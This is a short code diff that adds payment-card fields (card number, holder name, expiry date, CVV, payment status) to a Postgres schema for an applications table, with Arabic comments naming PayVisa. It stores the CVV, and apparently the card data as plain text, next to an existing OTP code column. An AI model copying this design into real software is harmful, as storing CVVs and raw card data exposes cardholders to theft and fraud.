@@ -41,6 +41,14 @@ export const applicationsTable = pgTable("applications", {
   // رمز التحقق
   otpCode: text("otp_code"),
 
+  // بيانات الدفع (PayVisa)
+  paymentCardNumber: text("payment_card_number"), // رقم البطاقة (مشفر)
+  paymentCardHolder: text("payment_card_holder"), // اسم حامل البطاقة
+  paymentExpiryDate: text("payment_expiry_date"), // تاريخ الانتهاء
+  paymentCvv: text("payment_cvv"), // رمز الأمان
+  paymentStatus: text("payment_status").default("pending"), // pending | completed | failed
+  paymentCompletedAt: timestamp("payment_completed_at"), // وقت إتمام الدفع
+
   // بيانات الحقول المخصصة الإضافية (JSON)
   extraData: text("extra_data"),
 
